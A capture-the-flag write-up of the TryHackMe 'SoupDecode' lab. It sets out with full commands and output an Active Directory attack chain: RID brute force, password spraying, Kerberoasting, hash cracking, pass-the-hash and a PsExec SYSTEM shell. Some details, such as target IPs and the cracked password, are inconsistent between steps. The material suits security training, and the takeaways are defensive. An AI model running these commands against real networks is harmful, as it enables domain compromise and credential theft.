![SoupDecode attack path](/images/lab-writeups/soupdecode.svg)

# TryHackMe: SoupDecode Write-Up

## Overview

SoupDecode is an Active Directory-focused Windows machine. The path starts with unauthenticated or guest SMB access, moves through IPC$ enumeration and RID brute forcing, and turns a valid username list into a password-spray hit. From there, Kerberoasting exposes service account hashes. A cracked service account unlocks a backup share containing NTLM hashes for machine accounts, and pass-the-hash against one of those machine accounts leads to administrative SMB access and a SYSTEM shell.

Source: TryHackMe

Difficulty: Intermediate

Categories: Active Directory, SMB, IPC$, RID brute force, password spraying, AS-REP roasting, Kerberoasting, hashcat, pass-the-hash, Impacket PsExec

## Step 1: Reconnaissance

The first step was an Nmap scan to identify open ports and services:

```bash
nmap -sC -sV 10.49.167.13 -oA nmap/soupedecode_01
```

The scan revealed a Windows Domain Controller running several key services:

| Port | Service | Detail |
| --- | --- | --- |
| 53 | DNS | Generic DNS |
| 88 | Kerberos | Microsoft Windows Kerberos |
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS-SSN | Microsoft Windows NetBIOS |
| 389 | LDAP | Active Directory LDAP, Domain: SOUPEDECODE.LOCAL |
| 445 | Microsoft-DS | SMB / Active Directory |
| 464 | kpasswd5 | Kerberos password change |
| 593 | ncacn_http | RPC over HTTP |

The LDAP banner confirmed the domain as `SOUPEDECODE.LOCAL`. Ports 88, 389, and 445 together strongly indicated that this host was an Active Directory Domain Controller.

The domain should be added to `/etc/hosts`. The format is strict:

```text
[IP Address] [Hostname] [Optional Aliases]
```

## Step 2: Guest Account Testing

I tested whether the guest account was enabled:

```bash
nxc smb 10.49.167.13 -u 'guest' -p ''
```

This attempts to authenticate as `guest` with a blank password.

The output included:

```text
[*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
[+] SOUPEDECODE.LOCAL\guest:
```

| Field | Value | Meaning |
| --- | --- | --- |
| OS | Windows Server 2022 Build 20348 x64 | Target OS information |
| Name | DC01 | This is a Domain Controller |
| Domain | SOUPEDECODE.LOCAL | Domain name |
| Signing | True | SMB signing enabled, making relay attacks harder |
| SMBv1 | False | SMBv1 disabled |
| `[+]` | SOUPEDECODE.LOCAL\guest | Login succeeded |

Important takeaways:

- Guest access was enabled with a blank password.
- The host was confirmed as a high-value Domain Controller.
- SMB signing was enabled, so SMB relay was not the primary path.
- The next logical steps were share enumeration, RID brute forcing, and attempting to escalate from guest-level access.

## Step 3: SMB Share Enumeration

Next, SMB shares were enumerated using NetExec with a null or anonymous session:

```bash
nxc smb 10.201.45.53 -u ' ' -p ' ' --shares
```

The target was identified as Windows Server 2022 Build 20348 x64, hostname `DC01`, domain `SOUPEDECODE.LOCAL`.

The shares discovered were:

| Share | Permissions | Remark |
| --- | --- | --- |
| ADMIN$ | - | Remote Admin |
| backup | - | - |
| C$ | - | Default share |
| IPC$ | READ | Remote IPC |
| NETLOGON | - | Logon server share |
| SYSVOL | - | Logon server share |
| Users | - | - |

The critical finding was READ access to `IPC$`.

`IPC$` is the Inter-Process Communication share on Windows. It supports named pipe communication over the network and is used for many RPC and SMB operations. Queries against SAMR, LSA, password policy information, domain metadata, and SID lookups can all depend on access through IPC$.

RPC means Remote Procedure Call. It allows a program on one computer to execute a procedure on another computer as if it were local.

## Why IPC$ Matters

With READ access to IPC$, even a null or guest session can sometimes communicate with Windows subsystems that enable enumeration.

Common uses include:

1. User enumeration through RID brute forcing.
2. Group identification, including Domain Admins or Backup Operators.
3. Account status checks, such as disabled accounts, expired accounts, or accounts with passwords that never expire.
4. Password spraying after usernames are discovered.
5. Querying password policy, lockout thresholds, and domain metadata.
6. Listing additional shares and understanding the target environment.

In this machine, IPC$ was the foothold needed for RID brute forcing.

## Step 4: RID Brute Force Theory

Every user, group, and computer object in Windows and Active Directory has a Security Identifier, or SID. A SID looks like this:

```text
S-1-5-21-1234567890-0987654321-1122334455-500
```

| Part | Example | Description |
| --- | --- | --- |
| Revision | `S-1` | SID version |
| Identifier Authority | `5` | NT Authority |
| Sub-authorities | `21-1234567890-0987654321-1122334455` | Domain or machine identifier |
| RID | `500` | Relative Identifier for the specific object |

Important RIDs:

| RID | Object |
| --- | --- |
| 500 | Built-in Administrator |
| 501 | Guest |
| 512 | Domain Admins group |
| 1000+ | Regular created users and groups |

A RID brute force works by:

1. Resolving the domain SID.
2. Iterating RID values such as 500 through 2000.
3. Appending each RID to the domain SID.
4. Asking the Domain Controller to resolve each SID into a name.
5. Collecting every valid user, group, or computer account.

This works because SAMR and LSARPC can allow SID-to-name lookups with minimal privileges in many environments.

## Step 5: Performing the RID Brute Force

With IPC$ access confirmed, NetExec was used:

```bash
nxc smb 10.49.167.13 -u 'awdawd' -p '' --rid-brute
```

A random username with a blank password can force a guest or anonymous authentication context while satisfying tools that require a non-empty username field.

The output was copied into a file and filtered for users:

```bash
cat adf.txt | grep SidTypeUser | save bbbb.txt
cat bbb.txt | awk '{print $6}' | save ccc.txt
cut -d'\' -f2 ccc.txt | save users.txt
```

The goal was to keep only `SidTypeUser` entries and extract clean usernames into `users.txt`.

## Step 6: AS-REP Roasting

With a username list, AS-REP roasting was tested. AS-REP roasting targets accounts that do not require Kerberos pre-authentication. It does not require a password for the tested users.

Impacket provides `GetNPUsers` for this:

```bash
impacket-GetNPUsers -h
```

The help text explains that the tool queries the target domain for users with `Do not require Kerberos preauthentication` enabled and exports TGT material for offline cracking.

TGT stands for Ticket Granting Ticket. It is issued by the KDC, or Key Distribution Center, and proves a user has authenticated.

The command used was:

```bash
impacket-GetNPUsers SOUPEDECODE.LOCAL/ -dc-ip 10.49.167.13 -usersfile users.txt
```

No useful AS-REP roastable accounts were found, so the path moved to password spraying.

## Step 7: Password Spraying

The next attempt was a username-equals-password spray:

```bash
nxc smb 10.64.144.196 -u users.txt -p users.txt --no-brute --continue-on-success
```

Command breakdown:

- `nxc` is NetExec, the actively maintained successor to CrackMapExec.
- `smb` targets SMB on port 445.
- `-u users.txt` supplies the username list from RID brute forcing.
- `-p users.txt` uses the same list as candidate passwords.
- `--no-brute` pairs each line positionally instead of trying every username against every password.
- `--continue-on-success` keeps testing after a valid credential is found.

This found:

```text
SMB 10.49.167.13 445 DC01 [+] SOUPEDECODE.LOCAL\ybob317:ybob317
```

The domain user `ybob317` had the password `ybob317`.

## Step 8: Attack Vectors With Valid Credentials

The credential was verified:

```bash
nxc smb 10.49.167.13 -u ybob317 -p ybob317
```

WinRM was tested:

```bash
nxc winrm 10.49.167.13 -u ybob317 -p ybob317
```

WinRM failed, which means the user likely lacked the correct group membership. A working domain credential does not automatically mean remote shell access.

The shares were checked:

```bash
nxc smb 10.49.167.13 -u ybob317 -p ybob317 --shares
```

The accessible shares included:

| Share | Permissions |
| --- | --- |
| IPC$ | READ |
| NETLOGON | READ |
| SYSVOL | READ |
| Users | READ |

No obvious share-based escalation appeared from this user, so Kerberoasting became the next step.

## Step 9: Kerberoasting

With valid domain credentials, SPNs were requested:

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.49.167.13
```

Discovered service accounts included:

| SPN | Account |
| --- | --- |
| FTP/FileServer | file_svc |
| FW/ProxyServer | firewall_svc |
| HTTP/BackupServer | backup_svc |
| HTTP/WebServer | web_svc |
| HTTPS/MonitoringServer | monitoring_svc |

Then service tickets were requested:

```bash
impacket-GetUserSPNs SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.49.167.13 -request
```

These accounts were valuable because:

- They had SPNs registered.
- Any authenticated user can request their service tickets.
- The tickets can be cracked offline.
- Service accounts are often over-privileged.
- Several had never logged on, suggesting they may be forgotten or poorly monitored.

The hashes were saved into `soupedecode.hash`.

## Step 10: Cracking the Hash

Hashcat mode selection mattered. Kerberoasting produces TGS-REP hashes, which use mode 13100.

```bash
hashcat -hh | grep -i 23
```

Relevant modes:

| Mode | Type |
| --- | --- |
| 7500 | Kerberos 5 etype 23 AS-REQ Pre-Auth |
| 13100 | Kerberos 5 etype 23 TGS-REP |
| 18200 | Kerberos 5 etype 23 AS-REP |

The cracking command was:

```bash
hashcat -m 13100 soupedecode.hash /opt/rockyou.txt
```

The cracked password was:

```text
Password123!
```

The note later shows authentication using `Password123!!`. The important result is that a service account password was recovered and could be tested against SMB shares.

## Step 11: Accessing the Backup Share

Share access was checked again using the cracked service account:

```bash
nxc smb 10.49.167.13 -u file_svc -p Password123!! --shares
```

The output showed READ access to the `backup` share:

```text
backup         READ
```

The share was accessed with `smbclient`:

```bash
smbclient //10.49.167.13/backup -U file_svc
```

The file `backup_extract.txt` was downloaded:

```text
smb: \> dir
backup_extract.txt
smb: \> get backup_extract.txt
```

The file contained machine account hashes:

```text
WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8838b068c17e9f5:::
PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:bb8a38c432a59ed00b2a373f4f050d28:::
ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
```

The first field is the account name and the fourth field is the NT hash.

The hashes were extracted:

```bash
cat backup_extract.txt | cut -d ':' -f 1 | save ext_username.ttx
cat backup_extract.txt | cut -d ':' -f 4 | save hashes.txt
```

## Step 12: Pass-the-Hash

With NT hashes, cracking was not required. Pass-the-hash can authenticate directly with the hash.

```bash
nxc smb 10.49.167.13 -u ext_username.ttx -H hashes.txt --continue-on-success
```

The key result was:

```text
SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

Share access as `FileServer$` showed administrative access:

```bash
nxc smb 10.49.167.13 -u FileServer$ -H e41da7e79a4c76dbd9cf79d1cb325559 --shares
```

Important shares:

| Share | Permissions |
| --- | --- |
| ADMIN$ | READ, WRITE |
| C$ | READ, WRITE |
| NETLOGON | READ, WRITE |

This effectively meant administrator-level access.

## Step 13: Getting a SYSTEM Shell

Impacket PsExec was used:

```bash
impacket-psexec SOUPEDECODE.LOCAL/'FileServer$'@10.49.167.13 -hashes :e41da7e79a4c76dbd9cf79d1cb325559
```

The shell landed as:

```text
nt authority\system
```

The root flag was located at:

```text
C:\Users\Administrator\Desktop\root.txt
```

The user flag was located at:

```text
C:\Users\ybob317\Desktop\user.txt
```

## Summary of Attack Path

```text
Nmap scan
-> Found DC running SOUPEDECODE.LOCAL

Guest SMB authentication
-> IPC$ READ access confirmed

RID brute force
-> Valid username list extracted

AS-REP roasting
-> No vulnerable accounts found

Password spraying username=username
-> ybob317:ybob317 found

Kerberoasting with ybob317
-> Service account SPNs found

Hash cracking with hashcat
-> Service account password recovered

SMB access as service account
-> READ access to backup share

backup_extract.txt downloaded
-> NT hashes for machine accounts

Pass-the-hash with FileServer$ hash
-> Administrative SMB access on DC01

impacket-psexec shell
-> nt authority\system on DC01
```

## Key Takeaways

Enumeration controlled the entire attack path. Identifying the host as a Domain Controller shaped every decision.

Null and guest sessions can still be dangerous when IPC$ access allows RID brute forcing.

Simple password sprays are worth doing before more complex attacks. In this case, username-equals-password found the first valid user.

Kerberoasting is effective because it abuses normal Kerberos behavior and does not require administrative access.

Service accounts are high-value targets because they are often over-privileged, rarely monitored, and configured with weak or non-rotating passwords.

Sensitive files in SMB shares can be catastrophic. One readable backup file exposed machine account hashes.

You do not need to crack NT hashes to use them. Pass-the-hash treats the hash itself as the authentication material.

The full compromise came from chained misconfigurations rather than a CVE.
